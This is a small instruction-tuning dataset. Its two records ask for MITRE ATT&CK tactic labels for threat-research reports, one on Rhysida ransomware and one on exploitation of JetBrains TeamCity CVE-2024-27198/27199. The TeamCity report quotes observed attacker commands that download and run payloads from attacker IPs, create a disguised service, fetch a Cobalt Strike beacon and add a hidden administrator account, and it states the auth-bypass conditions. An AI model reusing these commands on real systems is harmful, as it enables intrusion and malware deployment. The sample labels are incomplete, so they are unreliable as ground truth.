{"prompt": "Below is an instruction that describes a task, paired with an input that provides further context. Write a response that appropriately completes the request.\n\n### Instruction:\nPlease help me select the Cybersecurity Classification from content based on cybersecurity classification, and return them in JSON format. Only tell me the category names.\n\n### Input:\ncontent : Updated on August 9, 2023, 9:30 a.m. EDT: We updated the entry to include an analysis of current Rhysida ransomware samples\u2019 encryption routine. \u00a0 Updated on August 14, 2023, 6:00 a.m. EDT: We updated the entry to include Trend XDR workbench alerts for Rhysida and its components.IntroductionOn August 4, 2023, the HHS\u2019 Health Sector Cybersecurity Coordination Center (HC3) released a security alert about a relatively new ransomware called Rhysida (detected as Ransom.PS1.RHYSIDA.SM), which has been active since May 2023. In this blog entry, we will provide details on Rhysida, including its targets and what we know about its infection chain.Who is behind the Rhysida ransomware?Not much is currently known about the threat actors behind Rhysida in terms of origin or affiliations. According to the HC3 alert, Rhysida poses itself as a \u201ccybersecurity team\u201d that offers to assist victims in finding security weaknesses within their networks and system. In fact, the group\u2019s first appearance involved the use of a victim chat support portal.Who are Rhysida\u2019s targets?As mentioned earlier, Rhysida, which was previously known for targeting the education, government, manufacturing, and tech industries, among others \u2014 has begun conducting attacks on healthcare and public health organizations. The healthcare industry has seen an increasing number of ransomware attacks over the past five years. \u00a0This includes a recent incident involving Prospect Medical Holdings, a California-based healthcare system, that occurred in early August (although the group behind the attack has yet to be named as of writing).Data from Trend Micro\u2122 Smart Protection Network\u2122 (SPN) shows a similar trend, where detections from May to August 2023 show that its operators are targeting multiple industries rather than focusing on just a single sector.The threat actor also targets organizations around the world, with SPN data showing several countries where Rhysida binaries were detected, including Indonesia, Germany, and the United States.. How does a Rhysida attack proceed?. Rhysida ransomware usually arrives on a victim\u2019s machine via phishing lures, after which Cobalt Strike is used for lateral movement within the system.Additionally, our telemetry shows that the threat actors execute PsExec to deploy PowerShell scripts and the Rhysida ransomware payload itself. The PowerShell script (g.ps1), detected as Trojan.PS1.SILENTKILL.A, is used by the threat actors to terminate antivirus-related processes and services, delete shadow copies, modify remote desktop protocol (RDP) configurations, and change the active directory (AD) password.Interestingly, it appears that the script (g.ps1) was updated by the threat actors during execution, eventually leading us to a PowerShell version of the Rhysida ransomware.Rhysida ransomware employs a 4096-bit RSA key and AES-CTR for file encryption, which we discuss in detail in a succeeding section. After successful encryption, it appends the .rhysida extension and drops the ransom note CriticalBreachDetected.pdf.This ransom note is fairly unusual \u2014 instead of an outright ransom demand as seen in most ransom notes from other ransomware families, the Rhysida ransom note is presented as an alert from the Rhysida \u201ccybersecurity team\u201d notifying victims that their system has been compromised and their files encrypted. The ransom demand comes in the form of a \u201cunique key\u201d designed to restore encrypted files, which must be paid for by the victim.Summary of malware and tools used by RhysidaMalware: RHYSIDA, SILENTKILL, Cobalt StrikeTools: PsExec. Initial AccessPhishingBased on external reports, Rhysida uses phishing lures for initial accessLateral MovementPsExecMicrosoft tool used for remote executionCobalt Strike3rd party tool abused for lateral movementDefense EvasionSILENTKILLMalware deployed to terminate security-related processes and services, delete shadow copies, modify RDP configurations, and change the AD passwordImpactRhysida\u00a0ransomwareRansomware encryption. Table 1. A summary of the malware, tools, and exploits used by Rhysida. A closer look at Rhysida\u2019s encryption routine\u00a0After analyzing current Rhysida samples, we observed that the ransomware uses LibTomCrypt, an open-source cryptographic library, to implement its encryption routine. Figure 3 shows the procedures Rhysida follows when initializing its encryption parameters.\u00a0. Rhysida uses LibTomCrypt\u2019s pseudorandom number generator (PRNG) functionalities for key and initialization vector (IV) generation. The init_prng function is used to initialize PRNG functionalities as shown in Figure 4. The same screenshot also shows how the ransomware uses the library\u2019s ChaCha20 PRNG functionality.. After the PRNG is initialized, Rhysida then proceeds to import the embedded RSA key and declares the encryption algorithm it will use for file encryption:\u00a0It will use the register_cipher function to \u201cregister\u201d the algorithm (in this case, aes), to its table of usable ciphers.\u00a0It will use the find_cipher function to store the algorithm to be used (still aes), in the variable CIPHER.Afterward, it will proceed to also register and declare aes for its Cipher Hash Construction (CHC) functionalities.\u00a0Based on our analysis, Rhysida\u2019s encryption routine follows these steps:After it reads file contents for encryption, it will use the initialized PRNG\u2019s function, chacha20_prng_read, to generate both a key and an IV that are unique for each file.It will use the ctr_start function to initialize the cipher that will be used, which is aes (from the variable CIPHER), in counter or CTR mode.The generated key and IV are then encrypted with the rsa_encrypt_key_ex function.Once the key and IV are encrypted, Rhysida will proceed to encrypt the file using LibTomCrypt\u2019s ctr_encrypt function.. How can organizations protect themselves from Rhysida and other ransomware families?Although we are still in the process of fully analyzing Rhysida ransomware and its tools, tactics, and procedures (TTPs), the best practices for defending against ransomware attacks still holds true for Rhysida and other ransomware families.Here are several recommended measures that organizations implement to safeguard their systems from ransomware attacks:Create an inventory of assets and dataReview event and incident logsManage hardware and software configurations.Grant administrative privileges and access only when relevant to an employee's role and responsibilities.Enforce security configurations on network infrastructure devices like firewalls and routers.Establish a software whitelist permitting only legitimate applicationsPerform routine vulnerability assessmentsApply patches or virtual patches for operating systems and applicationsKeep software and applications up to date using their latest versionsIntegrate data protection, backup, and recovery protocolsEnable multifactor authentication (MFA) mechanismsUtilize sandbox analysis to intercept malicious emailsRegularly educate and evaluate employees' security aptitudeDeploy security tools (such as XDR) which are capable of detecting abuse of legitimate applicationsIndicators of compromiseHashes. The indicators of compromise for this entry can be found here.. MITRE ATT&CK Matrix. Initial AccessT1566 PhishingBased on external reports, Rhysida uses phishing lures for initial access.ExecutionT1059.003 Command and Scripting Interpreter: Windows Command ShellIt uses cmd.exe to execute commands for execution.T1059.001 Command and Scripting Interpreter: PowerShellIt uses PowerShell to create scheduled task named Rhsd pointing to the ransomware.PersistenceT1053.005 Scheduled Task/Job: Scheduled TaskWhen executed with the argument -S, it will create a scheduled task named Rhsd that will execute the ransomwareDefense EvasionT1070.004 Indicator Removal: File DeletionRhysida ransomware deletes itself after execution. The scheduled task (Rhsd) created would also be deleted after execution.T1070.001 Indicator Removal: Clear Windows Event LogsIt uses wevtutil.exe to clear Windows event logs.DiscoveryT1083 File and Directory DiscoveryIt enumerates and looks for files to encrypt in all local drives.T1082 System Information DiscoveryObtains the following information:Number of processorsSystem informationImpactT1490 Inhibit System RecoveryIt executes uses vssadmin to remove volume shadow copiesT1486 Data Encrypted for ImpactIt uses a 4096-bit RSA key and Cha-cha20 for file encryption.It avoids encrypting files with the following strings in their file name:.bat.bin.cab.cmd.com.cur.diagcab.diagcfg.diagpkg.drv.dll.exe.hlp.hta.ico.msi.ocx.ps1.psm1.scr.sys.ini.Thumbs.db.url.isoIt avoids encrypting files found in the following folders:$Recycle.BinBootDocuments and SettingsPerfLogsProgramDataRecoverySystem Volume InformationWindows$RECYCLE.BINApzDataIt appends the following extension to the file name of the encrypted files:.rhysidaIt encrypts all system drives from A to Z.It drops the following ransom note:{Encrypted Directory}\\CriticalBreachDetected.pdfT1491.001 Defacement: Internal DefacementIt changes the desktop wallpaper after encryption and prevents the user from changing it back by modifying the NoChangingWallpaper registry value.. Trend Micro SolutionsTrend solutions such as Apex One, \u00a0Deep Security,\u00a0 Cloud One Workload Security,\u00a0Worry-Free Business Security,\u00a0 Deep Discovery Web Inspector, Titanium Internet Security, and Cloud Edge can help protect against attacks employed by the Rhysida ransomware.The following solutions protect Trend customers from Rhysida attacks:. Trend Micro solutionsDetection Patterns / Policies / RulesTrend Micro Apex OneTrend Micro Deep SecurityTrend Micro Titanium Internet SecurityTrend Micro Cloud One Workload Security\u00a0Trend Micro Worry-Free Business Security ServicesRansom.Win64.RHYSIDA.SMRansom.Win64.RHYSIDA.THEBBBCRansom.Win64.RHYSIDA.THFOHBCTrojan.PS1.SILENTKILL.SMAJCTrojan.PS1.SILENTKILL.ATrend Micro Apex OneTrend Micro Deep SecurityTrend Micro Worry-Free Business Security ServicesTrend Micro Titanium Internet Security\u00a0RAN4056TRAN4052TTrend Micro Apex OneTrend Micro\u00a0Deep Discovery Web InspectorDDI Rule ID: 597 - \"PsExec tool detected\"DDI Rule ID: 1847 - \"PsExec tool detected - Class 2\"DDI Rule ID: 4524 - \"Possible Renamed PSEXEC Service - SMB2 (Request)\"DDI Rule ID: 4466 - \"PsExec Clones - SMB2 (Request)\"DDI Rule ID: 4571 - \"Possible Suspicious Named Pipe - SMB2 (REQUEST)\"DDI Rule ID: 4570 - \"COBALTSTRIKE - DNS(RESPONSE)\"DDI Rule ID: 4152 - \"COBALTSTRIKE - HTTP (Response)\"DDI Rule ID: 4469 - \"APT - COBALTSRIKE - HTTP (RESPONSE)\"DDI Rule ID: 4594 - \"COBALTSTRIKE - HTTP(REQUEST) - Variant 3\"DDI Rule ID: 4153 - \"COBALTSTRIKE - HTTP (Request) - Variant 2\"DDI Rule ID: 2341 - \"COBALTSTRIKE - HTTP (Request)\"DDI Rule ID: 4390 - \"CobaltStrike - HTTPS (Request)\"DDI Rule ID: 4870 - \"COBEACON DEFAULT NAMED PIPE - SMB2 (Request)\"DDI Rule ID: 4861 - \"COBEACON - DNS (Response) - Variant 3\"DDI Rule ID: 4860 - \"COBEACON - DNS (Response) - Variant 2\"DDI Rule ID: 4391 - \"COBEACON - DNS (Response)\"Trend Micro Apex OneTrend Micro Deep Security\u00a0Trend Micro Worry-Free Business Security ServicesTrend Micro Titanium Internet SecurityTrend Micro Cloud EdgeTroj.Win32.TRX.XXPE50FFF071. Trend Micro XDR uses the following workbench alerts to protect customers from Rhysida-related attacks:. Cobalt StrikeWorkbench AlertIDAnomalous Regsvr32 Execution Leading to Cobalt Strike63758d9f-4405-4ec5-b421-64aef7c85dcaCOBALT C2 Connectionafd1fa1f-b8fc-4979-8bf7-136db80aa264Early Indicator of Attack via Cobalt Strike0ddda3c1-dd25-4975-a4ab-b1fa9065568dLateral Movement of Cobalt Strike Beacon5c7cdb1d-c9fb-4b1d-b71f-9a916b10b513Possible Cobalt Strike Beacon45ca58cc-671b-42ab-a388-d972ff571d68Possible Cobalt Strike Beacon Active Directory Database Dumping1f103cab-9517-455d-ad08-70eaa05b8f8dPossible Cobalt Strike Connection85c752b8-93c2-4450-81eb-52ec6161088ePossible Cobalt Strike Privilege Escalation Behavior2c997bac-4fc0-43b4-8279-6f2e7cf723aePossible Fileless Cobalt Strikecf1051ba-5360-4226-8ffb-955fe849db53. PsExecWorkbench AlertIDPossible Credential Access via PSEXESVC Command Execution0b870a13-e371-4bad-9221-be7ad98f16d7Possible Powershell Process Injection via PSEXEC7fe83eb8-f40f-43be-8edd-f6cbc1399ac0Possible Remote Ransomware Execution via PsExec47fbd8f3-9fb5-4595-9582-eb82566ead7aPSEXEC Execution By Processe011b6b9-bdef-47b7-b823-c29492cab414Remote Execution of Windows Command Shell via PsExecb21f4b3e-c692-4eaf-bee0-ece272b69ed0Suspicious Execution of PowerShell Parameters and PSEXEC26371284-526b-4028-810d-9ac71aad2536Suspicious Mimikatz Credential Dumping via PsExec8004d0ac-ea48-40dd-aabf-f96c24906acf. SILENTKILLWorkbench AlertIDPossible Disabling of Antivirus Software64a633e4-e1e3-443a-8a56-7574c022d23fSuspicious Deletion of Volume\u00a0Shadow\u00a0Copy5707562c-e4bf-4714-90b8-becd19bce8e5. RhysidaWorkbench AlertIDRansom\u00a0Note\u00a0Detection (Real-time Scan)16423703-6226-4564-91f2-3c03f2409843Ransomware\u00a0Behavior Detection6afc8c15-a075-4412-98c1-bb2b25d6e05eRansomware\u00a0Detection (Real-time Scan)2c5e7584-b88e-4bed-b80c-dfb7ede8626dScheduled Task Creation via Command Line05989746-dc16-4589-8261-6b604cd2e186System-Defined\u00a0Event\u00a0Logs Clearing via Wevtutil639bd61d-8aee-4538-bc37-c630dd63d80f. Trend Micro Vision One hunting queryTrend Vision One customers can use the following hunting query to search for Rhysida within their system:processCmd:\"powershell.exe*\\\\*$\\?.ps1\" OR (objectFilePath:\"?:*\\\\??\\\\psexec.exe\" AND processCmd:\"*cmd.exe*\\\\??\\\\??.bat\")\n\n Mitre_Attack Tactics definition : {'Reconnaissance': 'The adversary is trying to gather information they can use to plan future operations', 'Resource Development': 'The adversary is trying to establish resources they can use to support operations', 'Initial Access': 'The adversary is trying to get into your ICS environment. The adversary is trying to get into your device. The adversary is trying to get into your network', 'Execution': 'The adversary is trying to run code or manipulate system functions, parameters, and data in an unauthorized way. The adversary is trying to run malicious code. The adversary is trying to run malicious code', 'Persistence': 'The adversary is trying to maintain their foothold in your ICS environment. The adversary is trying to maintain their foothold. The adversary is trying to maintain their foothold', 'Privilege Escalation': 'The adversary is trying to gain higher-level permissions. The adversary is trying to gain higher-level permissions. The adversary is trying to gain higher-level permissions', 'Defense Evasion': 'The adversary is trying to avoid security defenses. The adversary is trying to avoid being detected. The adversary is trying to avoid being detected', 'Credential Access': 'The adversary is trying to steal account names, passwords, or other secrets that enable access to resources. The adversary is trying to steal account names and passwords', 'Discovery': 'The adversary is locating information to assess and identify their targets in your environment. The adversary is trying to figure out your environment. The adversary is trying to figure out your environment', 'Lateral Movement': 'The adversary is trying to move through your ICS environment. The adversary is trying to move through your environment. The adversary is trying to move through your environment', 'Collection': 'The adversary is trying to gather data of interest and domain knowledge on your ICS environment to inform their goal. The adversary is trying to gather data of interest to their goal. The adversary is trying to gather data of interest to their goal', 'Command and Control': 'The adversary is trying to communicate with and control compromised systems, controllers, and platforms with access to your ICS environment. The adversary is trying to communicate with compromised devices to control them. The adversary is trying to communicate with compromised systems to control them', 'Exfiltration': 'The adversary is trying to steal data. The adversary is trying to steal data', 'Impact': 'The adversary is trying to manipulate, interrupt, or destroy your ICS systems, data, and their surrounding environment. The adversary is trying to manipulate, interrupt, or destroy your devices and data. The adversary is trying to manipulate, interrupt, or destroy your systems and data'}\n\n", "completion": "{\"Cybersecurity Classification\": [\"Initial Access\", \"Execution\", \"Impact\", \"Defense Evasion\"]}"}
{"prompt": "Below is an instruction that describes a task, paired with an input that provides further context. Write a response that appropriately completes the request.\n\n### Instruction:\nPlease help me select the Cybersecurity Classification from content based on cybersecurity classification, and return them in JSON format. Only tell me the category names.\n\n### Input:\ncontent : On March 4, 2024, JetBrains disclosed two critical vulnerabilities \u2014 CVE-2024-27198 and CVE-2024-27199 \u2014 within the TeamCity On-Premises platform that allow attackers to bypass authentication measures and gain administrative control over affected servers.Threat actors can exploit CVE-2024-27198 to perform a variety of malicious operations (which will be discussed in separate subsections), including:Dropping the Jasmin ransomwareDeploying the XMRig cryptocurrency minerDeploying Cobalt Strike beaconsDeploying the SparkRAT backdoorExecuting domain discovery and persistence commandsPublic proof-of-concept (POCs) exploits for these vulnerabilities already exist, heightening the risk of widespread exploitation. Given the active exploitation we\u2019ve observed via our telemetry, it's essential for organizations to promptly address these vulnerabilities to safeguard their data and systems. Customers of TeamCity with servers affected by these vulnerabilities are advised to update their software as soon as possible. The US Cybersecurity and Infrastructure Security Agency (CISA) has also added CVE-2024-27198 to its Known Exploited Vulnerabilities catalog. Trend Micro customers are protected from this vulnerability via the listed solutions at the end of this blog entry.Description of vulnerabilitiesRapid7 published an analysis of the two vulnerabilities in the JetBrains TeamCity continuous integration and continuous deployment (CI/CD) server that is currently being exploited in the wild with numerous proof of concepts proliferating on GitHub and social media.CVE-2024-27198: \u00adJetBrains TeamCity authentication bypass vulnerability\u00ad\u00ad \u00adCVE-2024-27198 is an authentication bypass vulnerability (with a Critical CVSS score of 9.8) in the web component of TeamCity that contains an alternative path issue (CWE-288). This vulnerability can be exploited by an unauthenticated attacker to achieve remote code execution (RCE).. To exploit CVE-2024-27198, an attacker must meet the following conditions:Generate an unauthenticated 404 HTTP Response.Pass the HTTP query string \u201c?jsp=/app/rest/server\u201d.Append \u201c;.jsp\u201d to the HTTP path parameter.CVE-2024-27199: JetBrains TeamCity directory traversal vulnerabilityCVE-2024-27199 is a directory traversal vulnerability (CWE-22) in the web component of TeamCity with a High CVSS score of 7.3 that can lead to authentication bypass. An attacker can leverage this vulnerability to leak sensitive information and modify a limited number of TeamCity system settings.. Several TeamCity paths are vulnerable to a directory traversal, including:/res//update//.well-known/acme-challenge/Post-Exploitation payloadsWithin the same timeframe of the disclosure TeamCity vulnerabilities, several proofs of concept were also made publicly available. Upon their publication, we observed instances of threat actors exploiting this vulnerability.. Threat actors might exploit CVE-2024-27198 or CVE-2024-27199 to bypass authentication on vulnerable On-Premise TeamCity servers and perform follow-on commands. They are then able to perform RCE and TeamCity-related processes, such as spawning a command and scripting interpreter (including PowerShell) to download additional malware or perform discovery commands. The attackers are then able to install malware that can reach out to its command-and-control (C&C) server and perform additional commands such as deploying Cobalt Strike beacons and remote access trojans (RATs). Ransomware can then be installed as a final payload to encrypt files and demand ransom payments from victims.Exploits that drop Jasmin ransomwareOne of the earliest threat actors that we found exploiting these vulnerabilities deployed a variant of the open-source Jasmin ransomware during the post-exploitation phase.We observed the following process tree via our telemetry:Parent Process:C:\\TeamCity\\jre\\bin\\java.exe Subject Process:C:\\Windows\\System32\\cmd.exe /c \"msiexec /q /i hxxp://207[.]246[.]102[.]242:56641/ABC[.]msi\"This process will download an MSI file (SHA256: 56942b36d5990f66a81955a94511298fd27cb6092e467110a7995a0654f17b1a) that will drop and execute a PE file (SHA256: 32a630decb8fcc8a7ed4811f4293b9d5a242ce7865ab10c19a16fc4aa384bf64).The ransomware has the ability to rename files with the extension .lsoc and drop a ransom note with the file name un-lock your files.html.. Upon checking the ransom note\u2019s source code, we discovered that it was obfuscated and used JavaScript to generate the ransom note text, likely to evade detection from security products and ensure that victims will see and read the ransom note file.. Deploying the XMRig cryptocurrency minerWe also found threat actors that were deploying a variant of the open-source XMRig cryptocurrency-mining malware to vulnerable TeamCity servers. Similar cryptominers were also be deployed in January 2024 after Ivanti Connect Secure VPN exploitation activities. The following is the cryptominer installation as seen from our telemetry:Parent Process:C:\\TeamCity\\jre\\bin\\java.exeSubject Process:C:\\Windows\\System32\\cmd.exe /c \"msiexec /q /i hxxp://146[.]70[.]149[.]185:58090/JavaAccessBridge-64.msi\"The downloaded MSI file (SHA256: 7cbe0c55b3ca5d12be640e519e4399469399b3eaada20705342fa681befe8c7b) will drop, decrypt, and execute the main XMRIG file named JavaAccessBridge-64.exe (SHA256: 01db4578f5fb7b29800f7b07a31fda7ff812309f62f7148fca0e246279f6ca61) alongside its two component files named config.json and WinRing0x64.sys on the C:\\Users\\Public\\Videos\\ directory.. The malware uses the vulnerable driver WinRing0x64.sys to access the model-specific register (MSR) to perform its mining routines when other methods fail.. The miner is configured to run using the following config file (saved in the config.json file):. This miner was installed using multiple stages of batch files and living-off-the-land binary (LOLBin) tools such as certutil.exe. Figure 11 shows the process tree and the executed commands as seen from Trend Micro Vision One\u2122 telemetry.\u00a0. Deploying the SparkRAT backdoorMeanwhile, another threat actor deployed a variant of the open-source Golang-based SparkRAT backdoor. We observed the executable binary java.exe under the TeamCity directory deploying a PowerShell command to download and execute a batch file named win.bat:Parent Process:C:\\TeamCity\\jre\\bin\\java.exeSubject Process:C:\\Windows\\System32\\cmd.exe /c \"powershell -ep bypass IEX (New-Object System.Net.Webclient).DownloadFile('hxxp://38[.]54[.]94[.]13:8080/win.bat','c:\\users\\public\\win.bat');start-process 'c:\\users\\public\\win.bat'\"The contents of the downloaded win.bat file are as follows:@echo off cmd /c certutil -urlcache -split -f hxxp://38[.]54[.]94[.]13:8080/86.dat c:\\users\\public\\public.dat cmd /c start /b c:\\users\\public\\public.dat sc create windowDefenSrv binPath= \"cmd /c start /b c:\\users\\public\\public.dat windowDefenSrv\" start= auto del c:\\users\\public\\win.batThis batch file will download and execute the SparkRAT malware (SHA256: 908b30abf730a5b51a3d25965eff45a639e881a97505220a38591fe326e00697) by abusing certutil, after which it will delete the original win.bat. The C&C server of this piece of malware is 38[.]54[.]94[.]13.The SparkRAT functions that were found inside the downloaded backdoor are consistent with the code from the open-source repository\u00a0https://github.com/XZB-1248/Spark.Similar to the cryptocurrency miner installation, the threat actors deploying SparkRAT also used a variety of batch files and LOLBins to perform a multistage attack. Figure 12 shows the process tree and the executed commands as seen from the Trend Vision One XDR telemetry.. Executing domain discovery and persistence commandsAside from malware deployment, we have also seen several attempts to discover network infrastructure and employ persistence commands arising from the java.exe process under a vulnerable TeamCity server directory.Parent Process:C:\\TeamCity\\jre\\bin\\java.exeWe observed the following subject processes being used for discovery and persistence tactics:C:\\WINDOWS\\system32\\net.exe\u00a0 group /domainC:\\WINDOWS\\system32\\net1.exe localgroup Administratoren /add Default$C:\\WINDOWS\\system32\\net1.exe localgroup Administrators /add Default$C:\\WINDOWS\\system32\\net1.exe user /add Default$ GH{redacted}23gwgC:\\WINDOWS\\system32\\net1.exe user /del defaultuser0C:\\WINDOWS\\system32\\net1.exe user /domainC:\\WINDOWS\\system32\\net1.exe user administratorC:\\WINDOWS\\system32\\net1.exe user default$C:\\WINDOWS\\system32\\nltest.exe\u00a0 /domain_trustsSeveral of these commands involve attempts to manipulate user accounts, groups, and permissions, which are typical actions taken by attackers seeking to gain unauthorized access to a system. The attempt to add a user to the local Administrators group is particularly concerning, since it could grant elevated privileges to attackers and help them establish a foothold in the system that can be used to maintain access over an extended period.Deploying Cobalt Strike beaconsFinally, we found threat actors deploying Cobeacon to vulnerable TeamCity servers. In one of the environments with a vulnerable TeamCity server, we found that a beacon (SHA1: db6bd96b152314db3c430df41b83fcf2e5712281) was deployed.The beacon was downloaded using the command curl\u00a0 hxxp://83[.]97[.]20[.]141:81/beacon.out -o .conf and was saved in the path C:\\TeamCity\\bin\\.conf.This was detected by the Trend Pattern Backdoor.Linux.COBEACON.SMYXDKV. The beacon reaches out to the C&C server 83[.]97[.]20[.]141, which we have already proactively detected as of this writing.ConclusionThe active exploitation of vulnerabilities within TeamCity On-Premises represents a critical threat to organizations relying on this platform for their CI/CD processes. Our telemetry has revealed that threat actors are exploiting these vulnerabilities to deploy ransomware, coinminers, and backdoor payloads on compromised TeamCity servers.This malicious activity not only jeopardizes the confidentiality, integrity, and availability of sensitive data and critical systems but also imposes financial and operational risks for affected organizations. Swift action is imperative to mitigate these vulnerabilities and prevent further damage from ransomware extortion and other types of malware.Trend SolutionsThe following protections exist to detect malicious activity and shield Trend customers against the exploitation of the TeamCity On-Premises vulnerabilities discussed in this entry.Trend Cloud One\u2122 \u2013 Network Security and TippingPoint\u2122 Filters43957 \u2013 HTTP: JetBrains TeamCity Directory Traversal Vulnerability43958 \u2013 HTTP: JetBrains TeamCity Authentication Bypass VulnerabilityTrend Vision One Network Sensor and Trend Micro\u2122 Deep Discovery\u2122 Inspector (DDI) Rules5011 \u2013 CVE-2024-27198 \u2013 JetBrains TeamCity Auth Bypass Exploit \u2013 HTTP (Response)5012 \u2013 CVE-2024-27199 \u2013 JetBrains TeamCity Directory Traversal Exploit \u2013 HTTP (Response)Trend Vision One Endpoint Security, Trend Cloud One \u2013 Workload and Endpoint Security, Trend Micro\u2122 Deep Security\u2122 Software, and Vulnerability Protection IPS Rules1011995 \u2013 JetBrains TeamCity Authentication Bypass Vulnerability (CVE-2024-21798)1011996 \u2013 JetBrains TeamCity Directory Traversal Vulnerability (CVE-2024-21799)Trend Vision One QueriesDescriptionTrend Vision One QueryJasmin ransomware file encryption eventeventSubId:101 AND processFilePath:abc.exe AND objectFilePath:.lsocService Installation of the Monero miner\u2019s dropped Kernel driver as seen from the registryeventSubId:402 and tags:XSAE.F7460 and objectRegistryData:WinRing0x64.sysDecoding of encrypted components dropped by the Monero miner MSI package through certutil.exeeventSubId:2 and processCmd:IndexStore.bat and objectCmd:(\"certutil\" and \"decode\")Execution of the SparkRAT malware from the batch fileeventSubId:2 and processFilePath:cmd.exe and processCmd:win.bat and objectCmd:windowDefenSrvDetection of suspicious process invocations from a TeamCity processeventSubId:2 AND processCmd:TeamCity AND objectCmd:(\"powershell\" OR \"net\" OR \"nltest\" OR \"msiexec\"). MITRE ATT&CK Matrix. TacticTechniqueIDInitial AccessExploit Public-Facing Application\u00a0T1190ExecutionPowerShellT1059.001Defense EvasionDe-obfuscate/Decode Files or InformationT1140DiscoveryAccount DiscoveryT1087DiscoveryDomain Trust DiscoveryT1482Command and ControlIngress Tool TransferT1105ExfiltrationExfiltration Over C2 ChannelT1041ImpactData Encrypted for ImpactT1486. Indicators of CompromiseThe indicators of compromise for this entry can be found here.\n\n Mitre_Attack Tactics definition : {'Reconnaissance': 'The adversary is trying to gather information they can use to plan future operations', 'Resource Development': 'The adversary is trying to establish resources they can use to support operations', 'Initial Access': 'The adversary is trying to get into your ICS environment. The adversary is trying to get into your device. The adversary is trying to get into your network', 'Execution': 'The adversary is trying to run code or manipulate system functions, parameters, and data in an unauthorized way. The adversary is trying to run malicious code. The adversary is trying to run malicious code', 'Persistence': 'The adversary is trying to maintain their foothold in your ICS environment. The adversary is trying to maintain their foothold. The adversary is trying to maintain their foothold', 'Privilege Escalation': 'The adversary is trying to gain higher-level permissions. The adversary is trying to gain higher-level permissions. The adversary is trying to gain higher-level permissions', 'Defense Evasion': 'The adversary is trying to avoid security defenses. The adversary is trying to avoid being detected. The adversary is trying to avoid being detected', 'Credential Access': 'The adversary is trying to steal account names, passwords, or other secrets that enable access to resources. The adversary is trying to steal account names and passwords', 'Discovery': 'The adversary is locating information to assess and identify their targets in your environment. The adversary is trying to figure out your environment. The adversary is trying to figure out your environment', 'Lateral Movement': 'The adversary is trying to move through your ICS environment. The adversary is trying to move through your environment. The adversary is trying to move through your environment', 'Collection': 'The adversary is trying to gather data of interest and domain knowledge on your ICS environment to inform their goal. The adversary is trying to gather data of interest to their goal. The adversary is trying to gather data of interest to their goal', 'Command and Control': 'The adversary is trying to communicate with and control compromised systems, controllers, and platforms with access to your ICS environment. The adversary is trying to communicate with compromised devices to control them. The adversary is trying to communicate with compromised systems to control them', 'Exfiltration': 'The adversary is trying to steal data. The adversary is trying to steal data', 'Impact': 'The adversary is trying to manipulate, interrupt, or destroy your ICS systems, data, and their surrounding environment. The adversary is trying to manipulate, interrupt, or destroy your devices and data. The adversary is trying to manipulate, interrupt, or destroy your systems and data'}\n\n", "completion": "{\"Cybersecurity Classification\": [\"Execution\", \"Discovery\"]}"}
